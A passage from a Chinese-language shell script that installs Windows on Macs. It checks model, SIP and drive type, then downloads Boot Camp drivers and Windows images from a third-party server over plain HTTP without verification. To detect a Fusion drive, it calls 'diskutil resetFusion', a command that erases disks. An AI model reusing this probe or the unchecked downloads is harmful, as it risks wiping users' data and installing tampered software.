	if [ "${CustomizeURL}" = "6136" ]; then
	if [ "$sip" ]; then
	if [ "$win10sip" ]; then
	clear && printf "\e[3J"
	echo "检查Recovery分区"	
	echo
	diskutil list
	echo
	echo
	read -s -n1 -p "此机型SIP未关闭，无法安装！！！"
    Customize
    fi
	fi
	if [ "$oldusb" ]; then
    Hostname="$(system_profiler SPUSBDataType | grep 'BSD Name:' | sed 's/.*\(disk[0123456789]*\).*/\1/g' | uniq )"
    else
    Hostname=$(diskutil list | grep external)
    fi	
	if [ "$Hostname" ]; then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "检测到移动盘，且此模式不支持安装到移动盘，请拔出！！！"
    XTLB	
	fi
	
if [ "$wzhfxt" = "6136" ]; then
if [[ $modelxh = "10.8"* ]]; then
wzhfxt="6135"
fi
fi
	
	if [ "$wzhfxt" = "7866" ]; then
clear && printf "\e[3J"
echo
echo
echo "                           ""\033[42;30m 如果此画面不动，请按一下回车\033[0m"
echo
echo	
	imacrhb="$(diskutil resetFusion | grep "Rotational")"	
	if [ ! "$imacrhb" ]; then
	if [[ $model512 = "4096 Bytes" ]]; then
	wzhfxt="7867"
	fi
	fi
	if [ "$imacpd" ]; then
	imacrhb="$(diskutil cs list | grep "Fusion")"	
	if [ ! "$imacrhb" ]; then
	if [[ $model512 = "4096 Bytes" ]]; then
	wzhfxt="7867"
	fi
	else
	wzhfxt="7866"
	fi	
	fi		
	fi
	
if [ "$wzhfxt" = "6721" ]; then	
clear && printf "\e[3J"
echo
echo
echo "                           ""\033[42;30m 如果此画面不动，请按一下回车\033[0m"
echo
echo
	imacrhb="$(diskutil resetFusion | grep "Rotational")"	
	if [ ! "$imacrhb" ]; then
	if [[ $model512 = "4096 Bytes" ]]; then
clear && printf "\e[3J"
echo
echo
echo "                           ""\033[42;30m 此电脑硬盘不支持此模式，请更换\033[0m"
echo
exit
	fi
	fi
	if [ "$imacpd" ]; then
	imacrhb="$(diskutil cs list | grep "Fusion")"	
	if [ ! "$imacrhb" ]; then
	if [[ $model512 = "4096 Bytes" ]]; then
clear && printf "\e[3J"
echo
echo
echo "                           ""\033[42;30m 此电脑硬盘不支持此模式，请更换\033[0m"
echo
exit
	fi
	else
	wzhfxt="6721"
	fi	
	fi	
fi		
	tarbc=""
	DrvWZ="1"
	WZname="5"$wzhfxt".dmg"
	name="5"$wzhfxt".dmg"
	url="$ip8/Win/10/5"$wzhfxt".dmg"
	if [ ! "$wzhfxt" ]; then
	WZname="56135.dmg"	
	name="56135.dmg"	
	url="$ip8/Win/10/56135.dmg"
	fi
	FenQu2
	fi


	if [ "${CustomizeURL}" = "116136" ]; then
	if [ "$sip" ]; then
	if [ "$win10sip" ]; then
	clear && printf "\e[3J"
	echo "检查Recovery分区"	
	echo
	diskutil list
	echo
	echo
	read -s -n1 -p "此机型SIP未关闭，无法安装！！！"
    Customize
    fi
	fi
	if [ "$oldusb" ]; then
    Hostname="$(system_profiler SPUSBDataType | grep 'BSD Name:' | sed 's/.*\(disk[0123456789]*\).*/\1/g' | uniq )"
    else
    Hostname=$(diskutil list | grep external)
    fi	
	if [ "$Hostname" ]; then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "检测到移动盘，且此模式不支持安装到移动盘，请拔出！！！"
    XTLB	
	fi
	
if [ "$wzhfxt" = "6136" ]; then
if [[ $modelxh = "10.8"* ]]; then
wzhfxt="6135"
fi
fi
	
#if [ "$wzhfxt" = "7072" ]; then
#wzhfxt="7071"
#fi
	
	if [ "$wzhfxt" = "7866" ]; then
clear && printf "\e[3J"
echo
echo
echo "                           ""\033[42;30m 如果此画面不动，请按一下回车\033[0m"
echo
echo	
	imacrhb="$(diskutil resetFusion | grep "Rotational")"	
	if [ ! "$imacrhb" ]; then
	if [[ $model512 = "4096 Bytes" ]]; then
	wzhfxt="7867"
	fi
	fi
	if [ "$imacpd" ]; then
	imacrhb="$(diskutil cs list | grep "Fusion")"	
	if [ ! "$imacrhb" ]; then
	if [[ $model512 = "4096 Bytes" ]]; then
	wzhfxt="7867"
	fi
	else
	wzhfxt="7866"
	fi	
	fi		
	fi
	
if [ "$wzhfxt" = "6721" ]; then	
clear && printf "\e[3J"
echo
echo
echo "                           ""\033[42;30m 如果此画面不动，请按一下回车\033[0m"
echo
echo
	imacrhb="$(diskutil resetFusion | grep "Rotational")"	
	if [ ! "$imacrhb" ]; then
	if [[ $model512 = "4096 Bytes" ]]; then
clear && printf "\e[3J"
echo
echo
echo "                           ""\033[42;30m 此电脑硬盘不支持此模式，请更换\033[0m"
echo
exit
	fi
	fi
	if [ "$imacpd" ]; then
	imacrhb="$(diskutil cs list | grep "Fusion")"	
	if [ ! "$imacrhb" ]; then
	if [[ $model512 = "4096 Bytes" ]]; then
clear && printf "\e[3J"
echo
echo
echo "                           ""\033[42;30m 此电脑硬盘不支持此模式，请更换\033[0m"
echo
exit
	fi
	else
	wzhfxt="6721"
	fi	
	fi	
fi		
	wzwim=""
	tarbc=""
	DrvWZ="1"
	WZname="8"$wzhfxt".dmg"
	name="8"$wzhfxt".dmg"
	url="$ip8/Win/11/8"$wzhfxt".dmg"
	if [ ! "$wzhfxt" ]; then
	WZname="86135.dmg"	
	name="86135.dmg"	
	url="$ip8/Win/11/86135.dmg"	
	fi
	FenQu2
	fi
	
	
	if [ "${CustomizeURL}" = "4033" ]; then
	if [ "$pcissd" ]; then
	echo
	echo
	echo
	echo "注意：检测到PCI转接硬盘！"
	echo
	echo
	read -s -n1 -p "PCI转接硬盘，无法安装Win7！！！"
    Customize
	fi
	if [ "$NoWin7" ]; then
	echo
    read -s -n1 -p "此机型不支持安装Win7！"
    Customize	
	fi
	if [ "$sip" ]; then
	clear && printf "\e[3J"
	echo "检查Recovery分区"	
	echo
	diskutil list
	echo
	echo
    read -s -n1 -p "SIP未关闭，无法安装！！！"
    Customize
	fi
	tarbc=""
	DrvWZ="1"
	MBR10="1"
	wzhfxt77="1"
	WZname="7"$wzhfxt7".dmg"
	name="7"$wzhfxt7".dmg"
	url="http://ty.mac55.com/server7254/7"$wzhfxt7".dmg"
	FenQu2
	fi


	if [ "${CustomizeURL}" = "4036" ]; then
	if [ "$pcissd" ]; then
	echo
	echo
	echo
	echo "注意：检测到PCI转接硬盘！"
	echo
	echo
	read -s -n1 -p "PCI转接硬盘，无法安装Win7！！！"
    Customize
	fi
	if [ "$NoWin7" ]; then
	echo
    read -s -n1 -p "此机型不支持安装Win7！"
    Customize	
	fi
	if [ "$No732" ]; then
	echo
    read -s -n1 -p "此机型不支持安装32位Win7"
    Customize	
	fi
	if [ "$sip" ]; then
	clear && printf "\e[3J"
	echo "检查Recovery分区"	
	echo
	diskutil list
	echo
	echo
    read -s -n1 -p "SIP未关闭，无法安装！！！"
    Customize
	fi
	tarbc=""
	DrvWZ="1"
	MBR10="1"
	wzhfxt77="1"
	WZname="7"$wzhfxt732".dmg"
	name="7"$wzhfxt732".dmg"
	url="http://ty.mac55.com/server7254/7"$wzhfxt732".dmg"
	FenQu2
	fi


	if [ "${CustomizeURL}" = "SysDrv" ]; then
	ipbc="1"
	if [ "$M1Yes" ]; then
	echo
    read -s -n1 -p "M1/M2电脑目前只支持安装虚拟机！！！"
    Customize	
	fi
	if [ "$sip" ]; then
	if [ "$win10sip" ]; then
	read -s -n1 -p "此机型SIP未关闭，无法安装！！！"
    Customize
    fi
	fi
	if [ "$oldusb" ]; then
    Hostname="$(system_profiler SPUSBDataType | grep 'BSD Name:' | sed 's/.*\(disk[0123456789]*\).*/\1/g' | uniq )"
    else
    Hostname=$(diskutil list | grep external)
    fi	
	if [ "$Hostname" ]; then
	echo
	if [ "$mbr10" ]; then
	echo
    read -s -n1 -p "检测到移动盘，且此机型不支持安装到移动盘，请拔出！！！"
    Customize	
	fi
    read -s -n1 -p "检测到移动盘，如不需要安装到移动盘请拔出！" numcs
	if [ "$numcs" = "0" ]; then
	Customize
	fi
	if [ "$oldusb" ]; then
    Hostname="$(system_profiler SPUSBDataType | grep 'BSD Name:' | sed 's/.*\(disk[0123456789]*\).*/\1/g' | uniq )"
    else
    Hostname=$(diskutil list | grep external)
    fi
    if [ "$Hostname" ]; then
    ydpaz="1"
    xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	fi	
	fi
	if [[ $modelxh = "10.10"* ]];then
	if [[ $modelbb = *"MacBook8,1"* ]]; then
	xtname="$Sys.dmg"
	name="$Sys.dmg"
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2	
	fi
	if [[ $modelbb = *"MacBookAir7,1"* ]]; then
	xtname="$Sys.dmg"
	name="$Sys.dmg"
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2	
	fi
	if [[ $modelbb = *"MacBookPro12,1"* ]]; then
	xtname="$Sys.dmg"
	name="$Sys.dmg"
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2	
	fi
	if [[ $modelbb = *"MacBookPro11,4"* ]]; then
	xtname="$Sys.dmg"
	name="$Sys.dmg"
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2	
	fi
	if [[ $modelbb = *"MacBookPro11,5"* ]]; then
	xtname="$Sys.dmg"
	name="$Sys.dmg"
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2	
	fi
	fi
	if [[ $modelbb = "MacBookAir5,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
    if [ "$sip" ]; then
    url="$ip8/BootCamp/2012Air.zip"
	else
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
    fi
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "MacBookAir5,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
    if [ "$sip" ]; then
    url="$ip8/BootCamp/2012Air.zip"
	else
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
    fi
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "MacBookAir4,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "MacBookAir4,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "MacBookPro10,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "MacBookPro10,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "MacBookPro9,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "MacBookPro9,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "MacBookPro8,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "MacBookPro8,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "MacBookPro8,3" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "iMac12,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else		
	if [[ $modelbb = "iMac12,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else		
	if [[ $modelbb = "iMac13,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "iMac13,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "iMac14,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "iMac14,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "iMac14,3" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "iMac14,4" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2
	else	
	if [[ $modelbb = "iMac15,1" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2
	else	
	if [[ $modelbb = "iMac16,1" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2
	else		
	if [[ $modelbb = "iMac16,2" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2
	else	
	if [[ $modelbb = "iMac17,1" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2
	else	
	if [[ $modelbb = "iMac18,1" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2
	else	
	if [[ $modelbb = "iMac18,2" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2
	else	
	if [[ $modelbb = "iMac18,3" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2
	else	
	if [[ $modelbb = "iMac19,1" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2
	else	
	if [[ $modelbb = "iMac19,2" ]];
	then
	if [ "$imachdd" ]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"	
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2	
	fi
	xtname="$Sys.dmg"
	name="$Sys.dmg"	
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2
	else	
	if [[ $modelbb = "Macmini6,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "Macmini6,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "Macmini7,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "Macmini5,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "Macmini5,2" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "MacPro5,1" ]];
	then
	xtname2=""$Sys"_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2=""$Sys"_HDD.dmg"	
	url2="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else		
	
	
	
	
	if [[ $modelxh = "10.10"* ]]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelxh = "10.9"* ]]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else
	if [[ $modelxh = "10.8"* ]]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelxh = "10.7"* ]]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2
	else	
	if [[ $modelxh = "10.6"* ]]; then
	xtname2=""$Sys"_HDD.dmg"
	name=""$Sys"_HDD.dmg"
	url="$ip8/666/"$Sys"_104.img.gz"
	FenQu2	
	
	
	
	else
	xtname="$Sys.dmg"
	name="$Sys.dmg"
	url="$ip8/666/"$Sys"_104.wim"
	FenQu2	
		
		
	fi	
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi
	fi	

			 
	if [ "${CustomizeURL}" = "800" ]; then
	
	if [ "$sip" ]; then
	if [ "$win10sip" ]; then
	read -s -n1 -p "SIP未关闭，无法安装！！！"
    Customize
    fi
    
	fi
	if [[ $modelbb = "MacBookAir7,1" ]];
	then
	xtname="Win8.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8.dmg"	
	url2="$ip8/666/Win8_104.wim"
	FenQu2
	else
	if [[ $modelbb = "MacBook8,1" ]];
	then
	xtname="Win8.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8.dmg"	
	url2="$ip8/666/Win8_104.wim"
	FenQu2
	else
	if [[ $modelbb = "MacBook9,1" ]];
	then
	xtname="Win8.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6427.zip"
	name2="Win8.dmg"	
	url2="$ip8/666/Win8_104.wim"
	FenQu2
	else
	if [[ $modelbb = "MacBookAir7,2" ]];
	then
	xtname="Win8.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8.dmg"	
	url2="$ip8/666/Win8_104.wim"
	FenQu2
	else
	if [[ $modelbb = "MacBookAir6,1" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5640.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "MacBookAir6,2" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5640.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "MacBookAir5,1" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "MacBookAir5,2" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "MacBookAir4,1" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "MacBookAir5,2" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else	
	if [[ $modelbb = "MacBookPro11,4" ]];
	then
	xtname="Win8.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8.dmg"	
	url2="$ip8/666/Win8_104.wim"
	FenQu2
	else
	if [[ $modelbb = "MacBookPro11,5" ]];
	then
	xtname="Win8.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8.dmg"	
	url2="$ip8/666/Win8_104.wim"
	FenQu2
	else
	if [[ $modelbb = "MacBookPro12,1" ]];
	then
	xtname="Win8.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8.dmg"	
	url2="$ip8/666/Win8_104.wim"
	FenQu2
	else
	if [[ $modelbb = "MacBookPro11,1" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5640.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "MacBookPro11,2" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5640.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "MacBookPro11,3" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5640.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "iMac16,1" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6237.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "iMac16,2" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6237.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "iMac17,1" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6237.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "iMac15,1" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp6.0.6136.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "iMac14,4" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5722.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "iMac14,1" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5640.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "iMac14,2" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5640.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else
	if [[ $modelbb = "Macmini7,1" ]];
	then
	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5769.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
	else



	xtname2="Win8_HDD.dmg"
	name="BootCamp.zip"
	url="$ip8/BootCamp/BootCamp5.1.5621.zip"
	name2="Win8_HDD.dmg"	
	url2="$ip8/666/Win8_104.img.gz"
	FenQu2
fi		
fi	
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi	
fi
fi
fi
fi
fi
fi
fi			
fi


	if [ "${CustomizeURL}" = "700" ]; then
	if [ "$pcissd" ]; then
	echo
	echo
	echo
	echo "注意：检测到PCI转接硬盘！"
	echo
	echo
	read -s -n1 -p "PCI转接硬盘，无法安装Win7！！！"
    Customize
	fi
	DrvWin7="1"
	if [ "$NoWin7" ]; then
	echo
    read -s -n1 -p "此机型不支持安装Win7！"
    Customize	
	fi
	if [ ! "$win7yes" ]; then
	if [ "$sip" ]; then
	clear && printf "\e[3J"
	echo	
	echo
	echo
    read -s -n1 -p "SIP未关闭，无法安装！！！"
    Customize
	fi
	fi
	if [ "$btap" ]; then
 	name="BootCamp$btap.zip"
	url="$ip8/BootCamp/BootCamp$btap.zip"
	else
 	name="BootCamp4.0.4033.zip"
	url="$ip8/BootCamp/BootCamp4.0.4033.zip"
    fi
    xtname3="7x64.dmg"
	name2="7x64.dmg"
	url2="$ip8/666/7x64_104.img.gz"
	FenQu2
	fi

}


SjMacDos(){	
clear && printf "\e[3J"	
echo
echo ID: "\033[36m${tbid}\033[0m"
echo
echo 正在安装中，请等待....
echo
if [ "$wzbsjmac" = "10.10" ]; then
